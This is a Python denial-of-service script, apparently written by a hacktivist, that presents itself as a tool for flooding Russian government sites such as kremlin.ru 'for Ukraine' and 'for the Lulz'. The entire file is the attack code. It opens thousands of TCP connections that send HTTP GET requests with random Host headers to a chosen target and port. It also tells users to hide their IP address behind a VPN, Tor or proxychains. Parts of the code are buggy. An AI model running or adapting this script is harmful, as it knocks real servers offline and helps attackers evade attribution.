#!/bin/python3
import os
import requests
try: from colorama import Style, Fore, Back
except: os.system("pip3 install colorama")
import sys
import socket
import time
import random

print(Style.BRIGHT + Fore.BLUE + """
   _  _    ___        ____          _ ____
 _| || |_ / _ \ _ __ |  _ \ ___  __| / ___|  ___ __ _ _ __ ___
|_  ..  _| | | | '_ \| |_) / _ \/ _` \___ \ / __/ _` | '__/ _ \\ """ + Fore.YELLOW + """
|_      _| |_| | |_) |  _ <  __/ (_| |___) | (_| (_| | | |  __/
  |_||_|  \___/| .__/|_| \_\___|\__,_|____/ \___\__,_|_|  \___|
               |_|
""" + Style.RESET_ALL + "\nDo it or no ballz.\nDo it for Ukraine.")


if sys.argv[1] == "--help" or sys.argv[1] == "-h":
	print("""
    Uno Lulzo Momento is a tool used for DoS attacks against the Russian government and its' supporters. (I may add some synchronized attack features later)
DDoSing is more of a form of protest, so this isn't effective on longer terms. If you can, use this tool when told to by other anons, so you can use it at
full power, and not interfiere with other attacks.\
Anyway here's the help screen:

./lulzo-momento.py -t [url] -p port --costum-messages [messages] <options>
-h, --help		shows this
-t, --target [url]	set the target url (example: https://kremlin.ru)
-p, --port [port]	set the target port, by default it will be 80 (80 - http ; 443 - https)
--costum-messages [msg]	set costum messages to send in the packets, separate by ',' (example: anonymous,we_are_legion,oprussia,lulz -- No spaces)
--no-questions		doesn't ask you questions (mostly for advanced users)
""")

port = 80
noq = False
dos = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
costumsg = []
costumsg.append("cocs")
requests_no = 10000

def dos():
	dos = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	print(Style.BRIGHT + Fore.GREEN + "[+]" + Style.RESET_ALL + " Starting attack...")
	for i in range(0, requests_no):
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((host, port))
			s.sendto(("GET /" + host + " HTTP/1.1\r\n").encode('ascii'), (host, port))
			s.sendto(("Host: " + str(random.randrange(0, 256)) + "." + str(random.randrange(0, 256)) + "." + str(random.randrange(0, 256)) + "." + str(random.randrange(0, 256)) + "\r\n\r\n").encode('ascii'), (host, port))
			global attack_num
			attack_num += 1
			print(attack_num)
			s.close()
		except: pass
			#print(Style.BRIGHT + Fore.RED + "[-]" + Style.RESET_ALL + " Connection failed. Sleeping 1 second...")
			#time.sleep(1)

for arg in range(1, 20):
	try:
		if sys.argv[arg] == "--no-questions": noq = True
	except: pass
for arg in range(1, 20):
	try:
		if sys.argv[arg] == "--costum-messages":
			costumsg.append(sys.argv[arg + 1].split(","))
	except: pass
if sys.argv[1] == "-t" or sys.argv[1] == "--target":
	print("But most importantly,\nDo it for the " + Back.RED + "Lulz" + Style.RESET_ALL + "\n")
	print(Style.BRIGHT + Fore.GREEN + "[+]" + Style.RESET_ALL + " Target set as: " + Style.BRIGHT + Fore.GREEN + sys.argv[2] + Style.RESET_ALL)
	host = sys.argv[2]
	try:
		if sys.argv[3] == "-p" or sys.argv[3] == "--port": port = sys.argv[4]
	except: pass
	print(Style.BRIGHT + Fore.GREEN + "[+]" + Style.RESET_ALL + " Port set as: " + Style.BRIGHT + Fore.GREEN + str(port) + Style.RESET_ALL)
	if noq == False: vpn = input("Are you using a VPN or Tor?[y/n]")
	if noq == False:
		if vpn == "y": print("Ok, you can continue.")
		else:
			print("THE FUCK IS WRONG WITH YOU! USE A VPN OR TOR! YOU DON'T WANT TO GIVE YOUR IP AWAY!")
			print("On linux you can use proxychains4 (proxychains4 ./lulzo-momento.py <options>)")
			print("If you're on windows (works on linux too), use ProtonVPN or something, it's very easy to set up. https://protonvpn.com")
			print("You can use --no-questions to avoid this next time")
	print(Style.BRIGHT + Fore.GREEN + "[+]" + Style.RESET_ALL + " " + Back.RED + "Lulz" + Style.RESET_ALL + " loaded. Ready to continue")
	dos()
	print(Style.BRIGHT + Fore.GREEN + "[+]" + Style.RESET_ALL + " Attack finished. Want to try again?")
